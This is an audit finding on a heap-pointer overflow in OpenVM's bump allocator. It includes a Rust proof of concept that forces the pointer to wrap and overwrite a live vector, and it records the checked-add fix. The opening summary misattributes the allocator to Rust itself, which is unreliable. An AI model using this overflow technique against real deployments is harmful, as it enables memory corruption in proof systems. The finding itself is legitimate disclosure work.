---
tags:
  - lang/rust
  - platform/cantina
  - has/poc
  - severity/high
  - sector/infra
protocol: "[[OpenVM]]"
auditors:
  - Leo Alt
report: "https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf"
genome:
  - "[[integer-bounds]]"
  - "[[known-pattern]]"
---
# Heap pointer can overﬂow 

- id: 53427
- impact: HIGH
- protocol: OpenVM
- reporter: Leo Alt (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf

## Summary


The report discusses a bug in the bump allocator of the Rust programming language. The bug allows an attacker to manipulate specific areas of the heap by causing an overflow in the heap pointer calculation. This can be exploited by requesting a large allocation, which can arise from user inputs. However, it is not easy to find this bug in the wild because Rust's `Vec` implementation checks for capacity overflow. The report recommends adding overflow checks to the allocator heap pointer updates to prevent this bug. The bug has been fixed in both OpenVM and Cantina Managed.

## Details

## Memory Allocator Vulnerability

## Context
`memory.rs#L97`

## Summary & Finding Description
In the bump allocator, the heap pointer is computed as `heap_pos += bytes` after an allocation. Below this line, there is a check that the allocator can't go into the SYSTEM area, but since the addition is not checked for overflow, we can return a new pointer that points to any heap cell. Because of the SYSTEM check, the allocation jump has to be at least `k = u32::MAX - 0x0c00_0000` to cause the bug.

## Impact Explanation
The exploit can be crafted so that it allows the attacker to manipulate specific areas of interest in the heap.

## Likelihood Explanation
Even though the Proof of Concept (PoC) below shows a direct exploit of the bug, it’s likely not trivial to find this in the wild, because:
- A user would have to request a large allocation at once (`k`), which can be caused if this is related to inputs.
- Rust's `Vec` implementation checks for capacity overflow which fails here because of `k`.
- The attacker would have to rely on other types and dependencies.

## Proof of Concept
In the code below, both assertions at the end succeed but should fail without the exploit. In fact, commenting out line `_alloc_overflow` makes the execution fail.

```rust
// src/main.rs
use openvm::io::{read, read_vec, reveal};
extern crate openvm;
use openvm::platform::memory::sys_alloc_aligned;
extern crate openvm_rv32im_guest;
extern crate alloc;

openvm::entry!(main);
fn main() {
    let n: u32 = read();
    let c = n * 2;
    let mut v1: Vec<u32> = Vec::new();
    v1.push(c as u32);
    let old_v1_0 = v1[0];
    let heap_ptr = unsafe { sys_alloc_aligned(4, 4) };
    let missing = u32::MAX - (heap_ptr as u32);
    let _alloc_overflow = unsafe { sys_alloc_aligned(missing as usize, 4) };
    let _alloc_overlap = unsafe { sys_alloc_aligned((v1.as_ptr() as usize) - 4, 4) };
    let mut v2: Vec<u32> = Vec::new();
    v2.push((c + 1) as u32);
    assert_eq!(v1, v2);
    assert!(old_v1_0 != v1[0]);
}
```

## Recommendation
Add overflow checks to the allocator heap pointer updates.

## OpenVM
Fixed in commit `8f508f29`, the fix prevents heap allocator overflow of `HEAP_PTR` by using `.checked_add` instead of `+=`, ensuring `HEAP_PTR` only increases and cannot overflow. This prevents accidental double allocation of the same memory. The fix also adds a negative test (copied from Cantina) that now passes but didn't used to. The fix is adapted from a similar fix in `risc0PR 2778`.

## Cantina Managed
Fix verified.
